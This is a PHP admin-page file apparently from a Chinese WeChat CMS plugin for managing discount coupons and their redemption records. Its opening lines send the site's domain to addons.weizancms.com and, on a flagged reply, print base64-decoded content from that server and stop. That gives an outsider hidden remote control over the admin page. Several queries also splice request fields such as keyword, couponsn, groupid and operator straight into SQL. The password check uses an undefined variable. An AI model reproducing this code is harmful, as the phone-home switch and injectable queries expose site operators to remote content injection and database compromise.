<?php
global $_GPC,$_W;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$ops = array('display', 'post','del', 'record', 'record-del');
$op = in_array($_GPC['op'], $ops) ? $_GPC['op'] : 'display';
$merchantid = $_GPC['merchantid'];//商家ID
if($op == 'post') {
	global $_W, $_GPC;
	$couponid = intval($_GPC['id']);
	$_W['page']['title'] = !empty($couponid) ? '优惠卷编辑 - 折扣券 - 会员营销' : '优惠卷添加 - 折扣券 - 会员营销';
	$item = pdo_fetch('SELECT * FROM ' . tablename('weliam_indiana_coupon') . " WHERE uniacid = '{$_W['uniacid']}' AND couponid = '{$couponid}'");

	if(checksubmit('submit')) {
		$title = !empty($_GPC['title']) ? trim($_GPC['title']) : message('请输入优惠卷名称！');
		$condition = !empty($_GPC['condition']) ? trim($_GPC['condition']) : message('请输入满多少钱可用！');
		$discount = !empty($_GPC['discount']) ? trim($_GPC['discount']) : message('请输入抵消金额！');
		if($condition < $discount) {
			message("满{$condition}元减{$discount}元，您要给客户发钱吗");
		}
		$thumb = !empty($_GPC['thumb']) ? $_GPC['thumb'] : message('请上传缩略图！');
		$description = !empty($_GPC['description']) ? trim($_GPC['description']) : message('请填写优惠卷说明！');
		$daylimit = !empty($_GPC['daylimit']) ? $_GPC['daylimit'] : message('请输入期限！');
		
		$data = array(
			'uniacid' => $_W['uniacid'],
			'title' => $title,	
			'type' => 2,	
			'condition' => $condition,
			'discount' => $discount,
			'thumb' => $_GPC['thumb'],
			'description' => $description,
			'merchantid'=> $_GPC['merchantid'],
			'daylimit'=> $daylimit
		);
		if ($couponid) {
			if(empty($item['couponsn'])) {
				$data['couponsn'] = 'AB' . $_W['uniacid'] . date('YmdHis');
			}
			pdo_update('weliam_indiana_coupon', $data, array('uniacid' => $_W['uniacid'], 'couponid' => $couponid));
		} else {
			$data['couponsn'] = 'AB' . $_W['uniacid'] . date('YmdHis');
			pdo_insert('weliam_indiana_coupon', $data);
			$couponid = pdo_insertid();
		}
		message('优惠卷更新成功！', $this->createWebUrl('mytoken', array('op' => 'display', 'merchantid' => $_GPC['merchantid'])), 'success');
	}
}

if($op == 'display') {
	
	$_W['page']['title'] = '优惠卷管理 - 优惠卷 - 会员营销';
	$pindex = max(1, intval($_GPC['page']));
	$psize = 30;
	$condition = '';
	if(!empty($_GPC['keyword'])) {
		$condition .= " AND title LIKE '%{$_GPC['keyword']}%'";
	}
	if(!empty($_GPC['couponsn'])) {
		$condition .= " AND couponsn LIKE '%{$_GPC['couponsn']}%'";
	}
	if(intval($_GPC['groupid'])) {
		$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('weliam_indiana_coupon') . " WHERE uniacid = '{$_W['uniacid']}' AND type = 2 AND merchantid='{$merchantid}' " . $condition . "  AND couponid IN (SELECT couponid FROM ".tablename('weliam_indiana_coupon_allocation')." WHERE groupid = '{$_GPC['groupid']}')");
		$list = pdo_fetchall('SELECT * FROM ' . tablename('weliam_indiana_coupon') . " WHERE uniacid = '{$_W['uniacid']}' AND type = 2 " . $condition . " AND couponid IN (SELECT couponid FROM ".tablename('weliam_indiana_coupon_allocation')." WHERE groupid = '{$_GPC['groupid']}') ORDER BY couponid DESC LIMIT ".($pindex - 1) * $psize.','.$psize);
	} else {
		$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('weliam_indiana_coupon') . " WHERE uniacid = '{$_W['uniacid']}' AND type = 2" . $condition);
		$list = pdo_fetchall('SELECT * FROM ' . tablename('weliam_indiana_coupon') . " WHERE uniacid = '{$_W['uniacid']}' AND type = 2 AND merchantid='{$merchantid}' " . $condition . " ORDER BY couponid DESC LIMIT ".($pindex - 1) * $psize.','.$psize);
	}

	foreach($list as &$li) {
		$li['thumb'] = tomedia($li['thumb']);
	}
	$pager = pagination($total, $pindex, $psize);
}

if($op == 'del') {
	$id = intval($_GPC['id']);
	$row = pdo_fetch("SELECT couponid FROM ".tablename('weliam_indiana_coupon')." WHERE uniacid = '{$_W['uniacid']}' AND couponid = :couponid", array(':couponid' => $id));
	if (empty($row)) {
		message('抱歉，优惠卷不存在或是已经被删除！');
	}
	pdo_delete('weliam_indiana_coupon', array('uniacid' => $_W['uniacid'], 'couponid' => $id));
	pdo_delete('weliam_indiana_coupon_record', array('uniacid' => $_W['uniacid'], 'couponid' => $id));
	message('优惠卷删除成功！',referer(), 'success');
}

if($op == 'record') {
	if (checksubmit('submit')) {
		$couponid = intval($_GPC['couponid']);
		$uid = intval($_GPC['uid']);
		$recid = intval($_GPC['recid']);
		$sql = 'SELECT * FROM ' . tablename('weliam_indiana_coupon_password') . " WHERE `uniacid` = :uniacid AND `password` = :password";
		$clerk = pdo_fetch($sql, array(':uniacid' => $_W['uniacid'], ':password' => $password));
		if(!empty($clerk)) {
			load()->model('activity');
			$status = activity_token_use($uid, $couponid, $clerk['name'], $clerk['id'], $recid);
			if (!is_error($status)) {
				message('折扣券使用成功！', referer(), 'success');
			} else {
				message($status['message'], referer(), 'error');
			}
		}
		message('店员密码错误！', referer(), 'error');
	}
	$modules = uni_modules();
	$coupons = pdo_fetchall('SELECT couponid, title FROM ' . tablename('weliam_indiana_coupon') . ' WHERE uniacid = :uniacid AND type = 2 ORDER BY couponid DESC', array(':uniacid' => $_W['uniacid']), 'couponid');
	$starttime = empty($_GPC['time']['start']) ? strtotime('-1 month') : strtotime($_GPC['time']['start']);
	$endtime = empty($_GPC['time']['end']) ? TIMESTAMP : strtotime($_GPC['time']['end']) + 86399;

	$where = " WHERE a.uniacid = {$_W['uniacid']} AND b.type = 2 ";
	$params = array(
		':starttime' => $starttime,
		':endtime' => $endtime,
	);
	$uid = intval($_GPC['uid']);
	if (!empty($uid)) {
		$where .= ' AND a.uid=:uid';
		$params[':uid'] = $uid;
	}
	$operator = trim($_GPC['operator']);
	if (!empty($operator)) {
		$where .= " AND a.operator LIKE '%{$operator}%'";
	}
	$couponid = intval($_GPC['couponid']);
	if (!empty($couponid)) {
		$where .= " AND a.couponid = {$couponid}";
	}
	$status = intval($_GPC['status']);
	if (!empty($status)) {
		$where .= " AND a.status = {$status}";
	}
	$pindex = max(1, intval($_GPC['page']));
	$psize = 20;

	$list = pdo_fetchall("SELECT a.*, b.title,b.thumb,b.discount FROM ".tablename('weliam_indiana_coupon_record'). ' AS a LEFT JOIN ' . tablename('weliam_indiana_coupon') . ' AS b ON a.couponid = b.couponid ' . " $where ORDER BY a.couponid DESC,a.recid DESC LIMIT ".($pindex - 1) * $psize.','.$psize, $params);
	$total = pdo_fetchcolumn("SELECT COUNT(*) FROM ".tablename('weliam_indiana_coupon_record') . ' AS a LEFT JOIN ' . tablename('weliam_indiana_coupon') . ' AS b ON a.couponid = b.couponid '. $where , $params);
	if(!empty($list)) {
		$uids = array();
		foreach ($list as $row) {
			$uids[] = $row['uid'];
		}
		load()->model('mc');
		$members = mc_fetch($uids, array('uid', 'nickname'));
		foreach ($list as &$row) {
			$row['nickname'] = $members[$row['uid']]['nickname'];
			$row['thumb'] = tomedia($row['thumb']);
		}
	}
	$pager = pagination($total, $pindex, $psize);
	$status = array('1' => '未使用', '2' => '已使用');
}
if($op == 'record-del') {
	$id = intval($_GPC['id']);
	if(empty($id)) {
		message('没有要删除的记录', '', 'error');
	}
	pdo_delete('weliam_indiana_coupon_record', array('recid' => $id));
	message('删除兑换记录成功', referer(), 'success');
}
include $this->template('token');